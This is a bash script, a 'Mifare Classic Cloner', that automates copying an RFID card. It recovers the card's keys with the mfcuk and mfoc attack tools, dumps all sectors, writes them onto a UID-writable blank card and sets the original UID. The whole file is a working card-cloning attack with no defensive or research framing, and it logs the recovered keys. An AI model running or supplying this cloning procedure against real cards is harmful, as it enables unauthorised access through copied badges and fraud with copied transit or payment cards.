#!/bin/bash

RED='\033[1;31m' # Red
GR='\033[0;32m' # Green
WH='\033[1;37m' # White
NC='\033[0m' # No Color

# banner
echo -e "\t\t${RED}Mifare Classic Cloner${NC}\n"

# remove previous dump files 
echo -e "${WH}Removing previous dump files..${NC}"
eval rm -f source_dump.mfd 
eval rm -f dest_dump.mfd 
eval rm -f snapshot.mfd
eval rm -f log.txt
echo -e "${GR}Done${NC}\n"

# ask user to press ENTER
read -p "Press ENTER after placing the card to clone on the reader " enter
if [[ -z $enter ]]; then 
	echo ""
else
	echo -e "${RED}Invalid choice${NC}"
	exit 1
fi

# --- Card to clone ---

# get the UID of the card to clone
echo -e "${WH}Getting UID of card to clone..${NC}"
uid=$(eval nfc-list | grep UID | sed 's/.*\: //' | sed 's/ //g')

if [ -z "$uid" ]
then
	echo -e "${RED}No card on reader${NC}"
	exit 1
else
	echo -e "${GR}Cart UID:${NC}" $uid "\n"
fi

# get A KEY
echo -e "${WH}Trying to recover A key, please wait..${NC}"
aKey=$(eval mfcuk -C -R 0:A -w 6 -v 3 2> /dev/null | grep 'recovered KEY' | sed 's/.*\: //' | sed 's/ //g')

# check if A KEY is found
if [ -z "$aKey" ]
then
	echo -e "${RED}Card key A not recovered${NC}"
	exit 1
else
	echo -e "${GR}Card A key recovered:${NC}" $aKey "\n"
fi

# get B KEY
echo -e "${WH}Trying to recover B KEY, please wait..${NC}"
eval mfoc -O source_dump.mfd -k $aKey &> /dev/null

# check if B KEY is found
FILE=source_dump.mfd
if [ -s $FILE ]; then
	echo -e "${GR}Card B key recovered${NC}\n"
else
	echo -e "${RED}Card key A not recovered${NC}"
	exit 1
fi

# compute date and md5 hash
date=$(eval date)
md5=$(eval md5sum source_dump.mfd)

# write information to log.txt
echo "Date:" $date > log.txt
echo "MD5:" $md5 >> log.txt
echo "UID:" $uid >> log.txt
echo "A key:" $aKey >> log.txt

echo -e "${WH}Remove the card${NC}\n"

# --- Brand new card UID writable --- 

# ask user to press ENTER
read -p "Press ENTER after placing the new card on the reader " enter
if [[ -z $enter ]]; then 
	echo -e "\n${WH}Dumping destination card, please wait..${NC}"
else
	echo -e "${RED}Invalid choice${NC}"
	exit 1
fi

# dump destination card
eval mfoc -O dest_dump.mfd > /dev/null

# check mfoc output
FILE=dest_dump.mfd
if [ -s $FILE ]; then
	echo -e "${GR}Destination card dump done${NC}\n"
else
	echo -e "${RED}Destination card dump not done${NC}"
	exit 1
fi

# write the destination card and the UID
echo -e "${WH}Writing data to the new card${NC}"
eval nfc-mfclassic w a dest_dump.mfd source_dump.mfd > /dev/null
eval nfc-mfsetuid $uid > /dev/null

# exit 
echo -e "${GR}Card successfully cloned${NC}"
exit 1